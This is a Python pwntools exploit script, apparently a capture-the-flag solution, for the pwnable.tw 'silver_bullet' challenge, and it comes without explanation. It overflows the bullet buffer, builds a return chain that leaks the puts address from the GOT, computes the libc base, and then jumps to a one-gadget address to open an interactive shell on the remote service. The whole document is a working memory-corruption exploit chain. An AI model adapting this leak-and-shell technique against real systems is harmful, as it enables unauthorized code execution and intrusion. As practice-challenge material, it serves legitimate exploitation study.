from pwn import *

if __name__ == '__main__':        
    context.log_level = 'debug'
    context.arch = 'amd64'
    LOCAL = 1
    DEBUG = 0

    # functions for quick script
    s       = lambda data               :t.send(str(data))       
    sa      = lambda delim,data         :t.sendafter(str(delim), str(data)) 
    sl      = lambda data               :t.sendline(str(data)) 
    sla     = lambda delim,data         :t.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :t.recv(numb)
    ru      = lambda delims, drop=True  :t.recvuntil(delims, drop)
    irt     = lambda                    :t.interactive()

    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
    # x64 below
    #16_04_magic = [0x45216,0x4526a,0xf02a4,0xf1147]

    #18_04_magic = [0x4f2c5,0x4f322,0x10a38c]

    if LOCAL:
        #t = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})
        t = remote('chall.pwnable.tw', 10103)
        elf = ELF('silver_bullet')
        libc = ELF('libc_32.so.6')
    else:
        t = remote('ip', 1337)
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    

    got_puts = elf.got['puts']
    plt_puts = elf.plt['puts']
    def debug():
        raw_input('go?')


    def add(content):
        sla('choice :', '1')
        sla('bullet :', content)

    def edit(content):
        sla('choice :', '2')
        sla('bullet :', content)

    def beat():
        sla('choice :', '3')


    debug()
    add(cyclic(46))
    edit('0000')
    edit(cyclic(7) + p32(plt_puts) + p32(0x8048954) + p32(got_puts))
    beat()
    beat()
    ru('You win !!\n')
    addr_puts = uu32(t.recvn(4))
    leak('addr_puts', addr_puts)
    libc = addr_puts - libc.symbols['puts']
    leak('addr_libc', libc)
    magic = libc + 0x3a819
    add(cyclic(46))
    edit('0000')
    edit(cyclic(7) + p32(magic) + p32(0x8048954))
    beat()
    beat()
    irt()

